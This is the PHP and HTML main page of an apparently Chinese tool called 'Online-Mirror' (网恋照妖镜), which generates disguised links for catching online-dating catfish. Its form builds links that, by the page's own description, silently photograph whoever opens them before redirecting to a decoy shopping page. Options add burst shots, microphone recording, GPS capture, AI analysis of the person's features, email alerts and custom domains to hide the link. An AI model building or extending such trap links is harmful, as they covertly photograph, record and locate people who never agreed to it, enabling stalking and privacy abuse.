<?php
/**
 * Online-Mirror v3.0 - 主页面
 * 支持双重模式：链接生成器 & 拍照入口
 */
session_start();
require_once __DIR__ . '/config.php';

// ========== 封禁IP拦截：禁止生成链接和查看内容 ==========
if (isIPBanned()) {
    $ban_info = getBanInfo();
    $ban_reason = getBanReason();
    $banned_by = $ban_info ? $ban_info['banned_by'] : '';
    $is_system = ($banned_by === 'system');
    $remaining = 0;
    if ($is_system && $ban_info && $ban_info['created_at']) {
        $remaining = max(0, 86400 - (time() - strtotime($ban_info['created_at'])));
    }
    die('<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>访问被拒绝</title><style>body{background:#0f0c29;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}@keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border:1px solid rgba(255,80,80,0.2);border-radius:24px;padding:40px;max-width:420px;width:100%;text-align:center;animation:fadeInUp 0.5s ease-out}.card .icon{font-size:64px;margin-bottom:16px}.card h1{font-size:24px;color:#ff6b6b;margin:0 0 4px}.card .sub{color:#8080a0;font-size:13px;line-height:1.6;margin:0}.card .reason{color:#a0a0b8;font-size:15px;line-height:1.6;margin:16px 0 0;padding:12px 16px;background:rgba(255,80,80,0.08);border-radius:12px;border:1px solid rgba(255,80,80,0.12)}.countdown-wrap{margin-top:20px;padding:16px;background:rgba(102,126,234,0.08);border:1px solid rgba(102,126,234,0.15);border-radius:14px}.countdown-wrap .label{font-size:12px;color:#8080a0;margin-bottom:6px}.countdown-wrap .timer{font-size:28px;font-weight:700;font-family:monospace;color:#667eea;letter-spacing:2px;animation:pulse 2s ease-in-out infinite}.countdown-wrap .hint{font-size:11px;color:#606080;margin-top:6px}</style></head><body><div class="card"><div class="icon">🚫</div><h1>拒绝访问</h1><p class="sub">您的请求已被系统拒绝</p><p class="reason">' . $ban_reason . '</p>' . ($is_system ? '<div class="countdown-wrap"><div class="label">⏳ 自动解封倒计时</div><div class="timer" id="countdown">' . sprintf('%02d:%02d:%02d', floor($remaining/3600), floor(($remaining%3600)/60), $remaining%60) . '</div><div class="hint">封禁到期后将自动刷新</div></div><script>var r=' . $remaining . ';!function t(){if(r<=0)location.reload();else{var e=document.getElementById("countdown");e&&(e.textContent=String(Math.floor(r/3600)).padStart(2,"0")+":"+String(Math.floor(r%3600/60)).padStart(2,"0")+":"+String(r%60).padStart(2,"0")),r--,setTimeout(t,1000)}}()</script>' : '') . '</div></body></html>');
}

$csrf = csrfToken();

// ========== 拍照模式：当传入 id&url 时跳转到 capture.php ==========
if (isset($_GET['id']) && isset($_GET['url'])) {
    $id = trim($_GET['id']);
    $url = trim($_GET['url']);
    if (!empty($id) && !empty($url)) {
        header('Location: capture.php?id=' . urlencode($id) . '&url=' . urlencode($url));
        exit;
    }
}

// 处理生成链接请求
$generated_link = '';
$generated_id = '';
$rate_error = '';
$show_qrcode = 1;
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'generate') {
    // 频率限制检查
    list($allowed, $msg) = checkRateLimit();
    if (!$allowed) {
        $rate_error = $msg;
    } else {
        requireCsrf();
        
        // 服务端滑块验证
        $slider_ok = isset($_POST['slider_pass']) && $_POST['slider_pass'] === '1';
        $disclaimer_ok = isset($_POST['disclaimer_accepted']) && $_POST['disclaimer_accepted'] === '1';
        
        if (!$slider_ok) {
            $rate_error = '请先完成滑块验证！';
        } elseif (!$disclaimer_ok) {
            $rate_error = '请先阅读并同意免责声明！';
        } else {
        
        $redirect_url = trim($_POST['redirect_url'] ?? 'https://mobile.yangkeduo.com/');
        $expire_days = intval($_POST['expire_days'] ?? 7);
        $tags = trim($_POST['tags'] ?? '');
        $tags = mb_substr(strip_tags($tags), 0, 200);
        $notify_email = trim($_POST['notify_email'] ?? '');
        $notify_email = filter_var($notify_email, FILTER_VALIDATE_EMAIL) ? $notify_email : null;
        $short_domain = trim($_POST['short_domain'] ?? '');
        $short_domain = mb_substr(strip_tags($short_domain), 0, 200);
        $burst_enabled = isset($_POST['burst_enabled']) && $_POST['burst_enabled'] === '1';
        $burst_count = $burst_enabled ? intval($_POST['burst_count'] ?? 0) : 0;
        $burst_count = ($burst_count >= 2 && $burst_count <= 5) ? $burst_count : null;
        $gps_enabled = isset($_POST['gps_enabled']) ? 1 : 0;
        $recording_enabled = isset($_POST['recording_enabled']) && $_POST['recording_enabled'] === '1' ? 1 : 0;
        $recording_seconds = $recording_enabled ? intval($_POST['recording_seconds'] ?? 5) : 0;
        $show_qrcode = isset($_POST['show_qrcode']) ? 1 : 0;
        $ai_enabled = isset($_POST['ai_enabled']) ? 1 : 0;
        $reverse_enabled = isset($_POST['reverse_enabled']) ? 1 : 0;
        $user_id = isLoggedIn() ? $_SESSION['user_id'] : null;
        
        // 生成唯一ID（确保不重复）
        do {
            $link_id = generateID(6);
            $db = getDB();
            $stmt = $db->prepare("SELECT COUNT(*) FROM mir_links WHERE link_id = ?");
            $stmt->execute([$link_id]);
        } while ($stmt->fetchColumn() > 0);
        
        // 计算过期时间
        $expires_at = date('Y-m-d H:i:s', strtotime("+{$expire_days} days"));
        
        // 入库
        $stmt = $db->prepare("INSERT INTO mir_links (link_id, redirect_url, user_id, tags, notify_email, short_domain, gps_enabled, recording_enabled, recording_seconds, burst_count, expires_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
        $stmt->execute([$link_id, $redirect_url, $user_id, $tags, $notify_email, $short_domain, $gps_enabled, $recording_enabled, $recording_seconds, $burst_count, $expires_at]);
        
        // 写入AI和反向图搜设置（新字段存设置表）
        setSetting('link_ai_' . $link_id, $ai_enabled ? '1' : '0');
        setSetting('link_reverse_' . $link_id, $reverse_enabled ? '1' : '0');
        } // end slider+disclaimer pass
        
        $generated_id = $link_id;
        // 自定义短域名
        if (!empty($short_domain)) {
            $domain = rtrim($short_domain, '/');
            $generated_link = $domain . '/mirror/index.php?id=' . $link_id . '&url=' . urlencode($redirect_url);
        } else {
            $generated_link = SITE_URL . 'index.php?id=' . $link_id . '&url=' . urlencode($redirect_url);
        }
        
        addLog($link_id, 'generate');
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<link rel="icon" type="image/x-icon" href="favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Online Mirror</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
.toggle-group {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 10px 0;
}
.toggle-group .label {
    font-size: 14px;
    color: #b0b0c8;
    display: flex;
    align-items: center;
    gap: 6px;
}
.toggle-group .label small {
    font-size: 12px;
    color: #606080;
}
.toggle {
    width: 44px;
    height: 24px;
    border-radius: 12px;
    background: rgba(255,255,255,0.12);
    cursor: pointer;
    position: relative;
    transition: all 0.3s;
    border: none;
    padding: 0;
    flex-shrink: 0;
}
.toggle.on {
    background: linear-gradient(135deg, #667eea, #764ba2);
}
.toggle .knob {
    width: 20px;
    height: 20px;
    border-radius: 50%;
    background: #fff;
    position: absolute;
    top: 2px;
    left: 2px;
    transition: all 0.3s;
    box-shadow: 0 1px 3px rgba(0,0,0,0.3);
}
.toggle.on .knob {
    left: 22px;
}
.toggle-field {
    display: none;
    margin-top: -6px;
    margin-bottom: 10px;
}
.toggle-field.show {
    display: block;
}

* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: linear-gradient(145deg, #0f0c29, #302b63, #24243e);
    min-height: 100vh;
    color: #e0e0e0;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
}
.container {
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 24px;
    padding: 40px;
    max-width: 580px;
    width: 100%;
    box-shadow: 0 25px 50px rgba(0,0,0,0.5);
}
.logo {
    text-align: center;
    margin-bottom: 30px;
}
.logo i {
    font-size: 48px;
    background: linear-gradient(135deg, #667eea, #764ba2);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
.logo h1 {
    font-size: 28px;
    margin-top: 10px;
    background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
.logo p {
    color: #a0a0b8;
    font-size: 14px;
    margin-top: 6px;
}
.form-group {
    margin-bottom: 18px;
}
.form-group label {
    display: block;
    font-size: 14px;
    color: #b0b0c8;
    margin-bottom: 6px;
    font-weight: 500;
}
.form-group label i {
    margin-right: 6px;
    width: 18px;
}
.form-group input, .form-group select {
    width: 100%;
    padding: 12px 16px;
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 12px;
    background: rgba(255,255,255,0.06);
    color: #e0e0e0;
    font-size: 15px;
    transition: all 0.3s;
    outline: none;
}
.form-group input:focus, .form-group select:focus {
    border-color: #667eea;
    box-shadow: 0 0 0 3px rgba(102,126,234,0.2);
    background: rgba(255,255,255,0.08);
}
.form-group select option { background: #1a1a2e; color: #e0e0e0; }
.btn-generate {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 12px;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
}
.btn-generate:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 25px rgba(102,126,234,0.4);
}
.btn-generate:active { transform: translateY(0); }

/* 二维码 */
.qrcode-wrap {
    text-align: center;
    padding: 12px 0 8px;
}
.qrcode-wrap img {
    width: 160px;
    height: 160px;
    border-radius: 12px;
    background: #fff;
    padding: 8px;
    transition: transform 0.3s;
}
.qrcode-wrap img:hover {
    transform: scale(1.05);
}

/* 结果区域 */
.result-box {
    margin-top: 24px;
    padding: 20px;
    background: rgba(255,255,255,0.05);
    border-radius: 16px;
    border: 1px solid rgba(255,255,255,0.08);
    display: <?php echo $generated_link ? 'block' : 'none'; ?>;
}
.result-box h3 {
    font-size: 14px;
    color: #a0a0b8;
    margin-bottom: 10px;
    display: flex;
    align-items: center;
    gap: 6px;
}
.result-box .link-display {
    display: flex;
    gap: 8px;
}
.result-box .link-display input {
    flex: 1;
    padding: 10px 14px;
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 10px;
    background: rgba(0,0,0,0.3);
    color: #c0c0d8;
    font-size: 13px;
    word-break: break-all;
    outline: none;
}
.result-box .link-display button {
    padding: 10px 16px;
    border: none;
    border-radius: 10px;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
    cursor: pointer;
    font-size: 14px;
    transition: all 0.3s;
    white-space: nowrap;
}
.result-box .link-display button:hover { opacity: 0.85; }
.result-box .tips {
    margin-top: 12px;
    padding: 12px;
    background: rgba(255,200,0,0.08);
    border: 1px solid rgba(255,200,0,0.15);
    border-radius: 10px;
    font-size: 13px;
    color: #d0b84a;
    line-height: 1.6;
}
.result-box .tips strong { color: #f0d060; }

/* 页脚 */
.footer {
    margin-top: 24px;
    text-align: center;
    font-size: 13px;
    color: #606080;
}
.footer a {
    color: #667eea;
    text-decoration: none;
}
.footer a:hover { text-decoration: underline; }
.footer .divider { margin: 0 8px; color: #404060; }
.footer .social-links {
    display:flex; align-items:center; justify-content:center; gap:12px;
    margin-bottom:10px;
}
.footer .social-links a {
    display:inline-flex; align-items:center; gap:4px;
    padding:6px 12px; border-radius:8px;
    background:rgba(255,255,255,0.04);
    border:1px solid rgba(255,255,255,0.06);
    color:#a0a0b8; font-size:12px; transition:all 0.3s;
}
.footer .social-links a:hover {
    background:rgba(255,255,255,0.08);
    border-color:rgba(102,126,234,0.3);
    color:#e0e0e0;
}
.footer .social-links a.dev-btn {
    background:rgba(102,126,234,0.1);
    border-color:rgba(102,126,234,0.2);
    color:#667eea;
}
.footer .social-links a.dev-btn:hover {
    background:rgba(102,126,234,0.2);
}

/* ====== 滑动验证码 ====== */
.slide-captcha {
    margin-bottom: 14px;
    text-align: left;
}
.slide-captcha .sc-label {
    display: block;
    font-size: 13px;
    color: #b0b0c8;
    margin-bottom: 4px;
}
.slide-captcha .sc-track {
    position: relative;
    height: 44px;
    border-radius: 12px;
    background: rgba(255,255,255,0.06);
    border: 1px solid rgba(255,255,255,0.12);
    overflow: hidden;
    cursor: pointer;
    user-select: none;
}
.slide-captcha .sc-fill {
    position: absolute;
    left: 0;
    top: 0;
    bottom: 0;
    width: 0;
    background: linear-gradient(90deg, #667eea, #764ba2);
    border-radius: 12px;
    transition: width 0.2s;
    opacity: 0.6;
}
.slide-captcha .sc-thumb {
    position: absolute;
    left: 2px;
    top: 2px;
    width: 40px;
    height: 40px;
    border-radius: 10px;
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 14px;
    cursor: grab;
    z-index: 2;
    box-shadow: 0 2px 6px rgba(0,0,0,0.3);
    transition: box-shadow 0.2s;
}
.slide-captcha .sc-thumb:active { cursor: grabbing; }
.slide-captcha .sc-text {
    position: absolute;
    left: 0;
    right: 0;
    top: 0;
    bottom: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 13px;
    color: #8080a0;
    z-index: 1;
    pointer-events: none;
}
.slide-captcha .sc-thumb.verified {
    background: linear-gradient(135deg, #4caf50, #2e7d32);
}
.slide-captcha .sc-track.verified {
    border-color: #4caf50;
}
.slide-captcha .sc-track.verified .sc-fill {
    background: linear-gradient(90deg, #4caf50, #2e7d32);
    opacity: 1;
}
.slide-captcha input[type="hidden"] {
    display: none;
}

/* 开发者弹窗 */
.dev-modal {
    display:none;
    position:fixed; top:0; left:0; right:0; bottom:0;
    z-index:9999; background:rgba(0,0,0,0.85);
    justify-content:center; align-items:center;
}
.dev-modal.show { display:flex; }
.dev-modal .modal-box {
    background:#1a1a2e;
    border:1px solid rgba(255,255,255,0.12);
    border-radius:16px; overflow:hidden;
    width:90vw; max-width:380px;
}
.dev-modal .modal-header {
    padding:14px 20px; display:flex; justify-content:space-between; align-items:center;
    border-bottom:1px solid rgba(255,255,255,0.06);
}
.dev-modal .modal-header h3 { font-size:16px; }
.dev-modal .modal-header .close-btn {
    font-size:24px; color:#8080a0; cursor:pointer; border:none; background:none;
}
.dev-modal .modal-header .close-btn:hover { color:#fff; }
.dev-modal .modal-body { padding:20px; }

/* 开发者卡片 */
.dev-card {
    background:rgba(255,255,255,0.04);
    border:1px solid rgba(255,255,255,0.08);
    border-radius:12px; padding:20px;
    text-align:center; cursor:pointer;
    transition:all 0.3s;
}
.dev-card:hover {
    background:rgba(255,255,255,0.08);
    border-color:rgba(102,126,234,0.3);
    transform:translateY(-2px);
}
.dev-card .avatar {
    width:72px; height:72px; border-radius:50%;
    border:3px solid rgba(102,126,234,0.3);
    margin:0 auto 12px; display:block;
    object-fit:cover;
}
.dev-card .name {
    font-size:18px; font-weight:600; color:#e0e0e0;
}
.dev-card .badge {
    display:inline-block;
    padding:2px 10px; border-radius:6px;
    background:rgba(255,193,7,0.15); color:#ffc107;
    font-size:11px; margin-top:4px;
}
.dev-card .motto {
    font-size:13px; color:#8080a0;
    margin-top:8px; font-style:italic;
}
.dev-card .click-hint {
    font-size:11px; color:#606080; margin-top:10px;
}

/* 复制邮箱toast */
.copy-toast {
    position:fixed; top:50%; left:50%;
    transform:translate(-50%,-50%) scale(0.8);
    padding:16px 28px; border-radius:12px;
    background:rgba(0,0,0,0.9); color:#fff;
    font-size:14px; z-index:10000;
    opacity:0; transition:all 0.3s ease;
    pointer-events:none;
}
.copy-toast.show {
    opacity:1; transform:translate(-50%,-50%) scale(1);
}

/* Toast */
.toast {
    position: fixed;
    top: 20px;
    left: 50%;
    transform: translateX(-50%) translateY(-100px);
    padding: 12px 24px;
    border-radius: 12px;
    background: rgba(0,0,0,0.85);
    color: white;
    font-size: 14px;
    transition: transform 0.4s ease;
    z-index: 999;
    pointer-events: none;
}
.toast.show { transform: translateX(-50%) translateY(0); }
.toast.success { background: rgba(0,200,80,0.9); }

@media (max-width: 480px) {
    .container { padding: 24px 16px; }
    .logo h1 { font-size: 22px; }
}

/* ========== 🎬 动画 ========== */
@keyframes fadeInUp {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
}
@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}
@keyframes slideDown {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
}
@keyframes pulse {
    0%, 100% { transform: scale(1); }
    50% { transform: scale(1.05); }
}
@keyframes shimmer {
    0% { background-position: -200% 0; }
    100% { background-position: 200% 0; }
}
@keyframes glow {
    0%, 100% { box-shadow: 0 0 5px rgba(102,126,234,0.3); }
    50% { box-shadow: 0 0 20px rgba(102,126,234,0.6); }
}
@keyframes float {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-6px); }
}

.container { animation: fadeInUp 0.5s ease-out; }
.stat-card { animation: fadeInUp 0.5s ease-out backwards; }
.stat-card:nth-child(1) { animation-delay: 0.05s; }
.stat-card:nth-child(2) { animation-delay: 0.1s; }
.stat-card:nth-child(3) { animation-delay: 0.15s; }
.stat-card:nth-child(4) { animation-delay: 0.2s; }
.result-box { animation: fadeInUp 0.4s ease-out; }

.btn-generate { transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
.btn-generate:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(102,126,234,0.4); animation: pulse 1.5s infinite; }
.btn-generate:active { transform: translateY(0); }

.stat-card { transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
.stat-card:hover { transform: translateY(-4px); border-color: rgba(102,126,234,0.4); box-shadow: 0 8px 25px rgba(0,0,0,0.3); }

.toggle { transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
.toggle:hover { transform: scale(1.05); }
.toggle .knob { transition: all 0.3s cubic-bezier(0.68,-0.55,0.27,1.55); }

.toggle-field { animation: slideDown 0.3s ease-out; }

.footer .social-links a { transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
.footer .social-links a:hover { transform: translateY(-2px); }

.dev-modal .modal-box { animation: fadeInUp 0.3s ease-out; }
.dev-modal.show .modal-box { animation: fadeInUp 0.3s ease-out; }

.result-box .link-display button { transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
.result-box .link-display button:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(102,126,234,0.3); }

.toast { transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
</style>
</head>
<body>
<div class="toast" id="toast"></div>

<div class="container">
    <div class="logo">
        <i class="fas fa-camera"></i>
        <h1>网恋照妖镜</h1>
        <p>是小姐姐，还是网图哥？</p>
    </div>

    <?php if ($rate_error): ?>
    <div id="rateLimitBox" style="padding:12px 16px;border-radius:12px;background:rgba(255,80,80,0.12);border:1px solid rgba(255,80,80,0.2);color:#ff6b6b;font-size:14px;margin-bottom:18px;text-align:center;">
        <i class="fas fa-exclamation-triangle"></i> 
        <span id="rateLimitMsg"><?php echo htmlspecialchars($rate_error); ?></span>
        <span id="rateLimitCountdown" style="display:none;font-weight:700;font-size:16px;" class=""></span>
    </div>
    <?php endif; ?>
    
    <form method="POST" onsubmit="return validateForm()">
        <input type="hidden" name="action" value="generate">
        <input type="hidden" name="csrf_token" value="<?php echo $csrf; ?>">
        
        <div class="form-group">
            <label><i class="fas fa-link"></i> 跳转地址</label>
            <input type="url" name="redirect_url" id="redirect_url" value="https://mobile.yangkeduo.com/" placeholder="https://example.com" required>
        </div>

        <div class="form-group">
            <label><i class="fas fa-clock"></i> 链接有效期</label>
            <select name="expire_days">
                <option value="1">1 天</option>
                <option value="3">3 天</option>
                <option value="7" selected>7 天</option>
                <option value="14">14 天</option>
                <option value="30">30 天</option>
            </select>
        </div>

        <!-- 标签开关 -->
        <div class="toggle-group">
            <div class="label">
                <i class="fas fa-tags"></i> 添加标签
                <small>分类管理链接</small>
            </div>
            <button type="button" class="toggle" id="toggleTagsBtn" onclick="toggleField('tags')">
                <div class="knob"></div>
            </button>
        </div>
        <div class="toggle-field" id="toggleTagsField">
            <div class="form-group" style="margin-bottom:0;">
                <input type="text" name="tags" placeholder="例如：微信、网友、小红书" style="width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,0.12);border-radius:12px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:15px;outline:none;">
            </div>
        </div>
        
        <!-- 邮箱通知开关 -->
        <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
            <div class="label">
                <i class="fas fa-envelope"></i> 邮箱通知
                <small>有人拍照时发邮件</small>
            </div>
            <div style="display:flex;align-items:center;gap:6px;">
                <span style="font-size:10px;color:#ff9800;display:<?php echo getSetting('email_enabled') !== '1' ? 'inline' : 'none'; ?>;">未配置</span>
                <button type="button" class="toggle" id="toggleEmailBtn" onclick="toggleField('email')">
                    <div class="knob"></div>
                </button>
            </div>
        </div>
        <div class="toggle-field" id="toggleEmailField">
            <div class="form-group" style="margin-bottom:0;">
                <input type="email" name="notify_email" placeholder="your@email.com" style="width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,0.12);border-radius:12px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:15px;outline:none;">
                <div style="font-size:11px;color:#606080;margin-top:4px;">有人打开链接拍照时，自动发送通知邮件到此地址</div>
            </div>
        </div>
        
        <!-- ====== 更多设置 ====== -->
        <div id="moreSettingsBtn" onclick="toggleMoreSettings()" style="border-top:1px solid rgba(255,255,255,0.06);padding:12px 0;cursor:pointer;display:flex;align-items:center;justify-content:space-between;color:#8080a0;font-size:14px;user-select:none;">
            <span><i class="fas fa-cog"></i> 更多设置</span>
            <span id="moreSettingsArrow" style="transition:transform 0.3s;"><i class="fas fa-chevron-down"></i></span>
        </div>
        <div id="moreSettingsBody" style="display:none;">
            
            <!-- AI分析开关（排最前） -->
            <div class="toggle-group" style="border-top:none;">
                <div class="label">
                    <i class="fas fa-robot"></i> AI 人像分析
                    <small>拍照后AI分析对方特征</small>
                </div>
                <div style="display:flex;align-items:center;gap:6px;">
                    <span style="font-size:10px;color:#ff9800;display:<?php echo empty(getSetting('ai_api_key')) ? 'inline' : 'none'; ?>;">未配置</span>
                    <button type="button" class="toggle on" id="toggleAiBtn" onclick="toggleField('ai')">
                        <div class="knob"></div>
                    </button>
                </div>
            </div>
            <input type="hidden" name="ai_enabled" id="aiEnabledInput" value="1">
            
            <!-- 反向图搜开关 -->
            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                <div class="label">
                    <i class="fas fa-search"></i> 反向图搜
                    <small>以图搜图查来源</small>
                </div>
                <button type="button" class="toggle on" id="toggleReverseBtn" onclick="toggleField('reverse')">
                    <div class="knob"></div>
                </button>
            </div>
            <input type="hidden" name="reverse_enabled" id="reverseEnabledInput" value="1">
            
            <!-- 二维码开关 -->
            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                <div class="label">
                    <i class="fas fa-qrcode"></i> 二维码
                    <small>生成链接二维码</small>
                </div>
                <input type="hidden" name="show_qrcode" id="showQrcodeInput" value="1">
                <button type="button" class="toggle on" id="toggleQrcodeBtn" onclick="toggleField('qrcode')">
                    <div class="knob"></div>
                </button>
            </div>
            
            <!-- 连拍模式开关 -->
            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                <div class="label">
                    <i class="fas fa-camera-retro"></i> 连拍模式
                    <small>多张连拍不遗漏</small>
                </div>
                <input type="hidden" name="burst_enabled" id="burstEnabledInput" value="0">
                <button type="button" class="toggle" id="toggleBurstBtn" onclick="toggleField('burst')">
                    <div class="knob"></div>
                </button>
            </div>
            <div class="toggle-field" id="toggleBurstField">
                <div class="form-group" style="margin-bottom:0;">
                    <select name="burst_count" style="width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,0.12);border-radius:12px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:15px;outline:none;">
                        <option value="2">2 张连拍</option>
                        <option value="3" selected>3 张连拍</option>
                        <option value="4">4 张连拍</option>
                        <option value="5">5 张连拍</option>
                    </select>
                    <div style="font-size:11px;color:#606080;margin-top:4px;">对方打开链接后将连续拍摄多张照片，防止眨眼闭眼漏拍</div>
                </div>
            </div>
            
            <!-- 记录地理信息开关 -->
            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                <div class="label">
                    <i class="fas fa-map-marker-alt"></i> 记录地理信息
                    <small style="color:#ff9800;">慎重开启，可能要求授权</small>
                </div>
                <button type="button" class="toggle" id="toggleGpsBtn" onclick="toggleField('gps')">
                    <div class="knob"></div>
                </button>
            </div>
            <div class="toggle-field" id="toggleGpsField" style="display:none;">
                <input type="hidden" name="gps_enabled" id="gpsEnabledInput" value="0">
                <div style="padding:10px 14px;border-radius:10px;background:rgba(255,152,0,0.08);border:1px solid rgba(255,152,0,0.15);font-size:12px;color:#ffa726;margin-bottom:10px;">
                    <i class="fas fa-exclamation-triangle"></i> 开启后对方打开链接时浏览器可能会弹出位置授权提示，请谨慎使用
                </div>
            </div>
            
            <!-- 录音采样开关 -->
            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                <div class="label">
                    <i class="fas fa-microphone"></i> 录音采样
                    <small>录制对方环境声音</small>
                </div>
                <input type="hidden" name="recording_enabled" id="recordingEnabledInput" value="0">
                <button type="button" class="toggle" id="toggleRecordingBtn" onclick="toggleField('recording')">
                    <div class="knob"></div>
                </button>
            </div>
            <div class="toggle-field" id="toggleRecordingField">
                <div style="padding:10px 14px;border-radius:10px;background:rgba(255,152,0,0.08);border:1px solid rgba(255,152,0,0.15);font-size:12px;color:#ffa726;margin-bottom:10px;">
                    <i class="fas fa-exclamation-triangle"></i> 开启后对方打开链接时浏览器可能会弹出麦克风授权提示，请谨慎使用
                </div>
                <div class="form-group" style="margin-bottom:0;">
                    <select name="recording_seconds" style="width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,0.12);border-radius:12px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:15px;outline:none;">
                        <option value="3">3 秒</option>
                        <option value="5" selected>5 秒</option>
                        <option value="10">10 秒</option>
                        <option value="15">15 秒</option>
                        <option value="30">30 秒</option>
                    </select>
                    <div style="font-size:11px;color:#606080;margin-top:4px;">对方打开链接后录制指定秒数的环境声音，录制完成后自动拍照</div>
                </div>
            </div>
            
            <!-- 自定义短域名开关 -->
            <div class="toggle-group" style="border-top:1px solid rgba(255,255,255,0.06);">
                <div class="label">
                    <i class="fas fa-globe"></i> 自定义短域名
                    <small>使用自己的域名</small>
                </div>
                <button type="button" class="toggle" id="toggleDomainBtn" onclick="toggleField('domain')">
                    <div class="knob"></div>
                </button>
            </div>
            <div class="toggle-field" id="toggleDomainField">
                <div class="form-group" style="margin-bottom:0;">
                    <input type="text" name="short_domain" placeholder="https://你的域名.com" style="width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,0.12);border-radius:12px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:15px;outline:none;">
                    <div style="font-size:11px;color:#606080;margin-top:4px;">生成的链接将使用此域名，需要在你的域名下部署相同的项目</div>
                </div>
            </div>
            
        </div>
        
        <!-- 滑动验证 -->
        <div class="slide-captcha">
            <label class="sc-label"><i class="fas fa-shield-alt"></i> 安全验证</label>
            <div class="sc-track" id="scTrack">
                <div class="sc-fill" id="scFill"></div>
                <div class="sc-thumb" id="scThumb" onmousedown="startDrag(event)" ontouchstart="startDragTouch(event)">
                    <i class="fas fa-arrow-right"></i>
                </div>
                <div class="sc-text" id="scText">请按住滑块拖动到最右侧</div>
            </div>
            <input type="hidden" name="slider_pass" id="sliderPass" value="0">
        </div>

        <button type="button" class="btn-generate" onclick="showDisclaimer(true)">
            <i class="fas fa-magic"></i> 生成镜像链接
        </button>
        <input type="hidden" name="disclaimer_accepted" id="disclaimerAccepted" value="0">
    </form>

    <div class="result-box" id="resultBox">
        <h3><i class="fas fa-check-circle" style="color:#4caf50;"></i> 镜像链接已生成</h3>
        <div class="link-display">
            <input type="text" id="generatedLink" value="<?php echo htmlspecialchars($generated_link); ?>" readonly>
            <button onclick="copyLink()"><i class="fas fa-copy"></i> 复制</button>
        </div>
        <div class="tips">
            <strong>⚠️ 温馨提示：</strong><br>
            ID: <code><?php echo htmlspecialchars($generated_id); ?></code>
            <button onclick="copyID()" style="margin-left:6px;padding:2px 10px;border:none;border-radius:6px;background:rgba(102,126,234,0.3);color:#667eea;cursor:pointer;font-size:12px;"><i class="fas fa-copy"></i> 复制ID</button>
            — 用此ID可在后台查看照片<br>
            对方打开链接后会自动拍摄一张照片并跳转到指定页面
            <?php if (isLoggedIn()): ?>
                <br><a href="dashboard.php" style="color:#667eea;">👉 前往后台管理</a>
            <?php endif; ?>
        </div>
        <div class="qrcode-wrap" id="qrcodeWrap" style="margin-top:14px;display:<?php echo ($generated_link && $show_qrcode ? 'block' : 'none'); ?>;">
            <div style="text-align:center;">
                <p style="font-size:12px;color:#8080a0;margin-bottom:8px;"><i class="fas fa-qrcode"></i> 扫一扫打开链接</p>
